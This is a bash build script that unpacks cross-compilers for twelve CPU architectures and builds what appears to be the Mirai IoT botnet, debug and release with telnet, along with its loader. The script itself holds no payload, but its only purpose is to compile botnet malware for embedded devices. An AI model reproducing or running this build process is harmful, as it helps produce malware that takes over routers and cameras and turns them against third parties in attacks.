#!/bin/bash

echo
echo ===== START BUILDING =====
echo

sudo chown user:user /etc/xcompile
cd /etc/xcompile
function install_compiler {
    if [ ! -d "$1" ]; then
        echo "Installing $1 compiler..."
        tar -jxf "/asset/cross-compiler-$1.tar.bz2"
        mv "cross-compiler-$1" "$1"
    fi
    export "PATH=$PATH:/etc/xcompile/$1/bin"
}
install_compiler "armv4l"
install_compiler "armv5l"
install_compiler "armv6l"
install_compiler "i586"
install_compiler "i686"
install_compiler "m68k"
install_compiler "mips"
install_compiler "mipsel"
install_compiler "powerpc"
install_compiler "sh4"
install_compiler "sparc"
install_compiler "x86_64"


cd ~/src

cd mirai
rm -rf debug
rm -rf release
mkdir debug
mkdir release
./build.sh debug telnet
./build.sh release telnet

cd ../loader
rm -f loader
./build.sh

echo
echo ===== BUILD FINISHED =====
echo
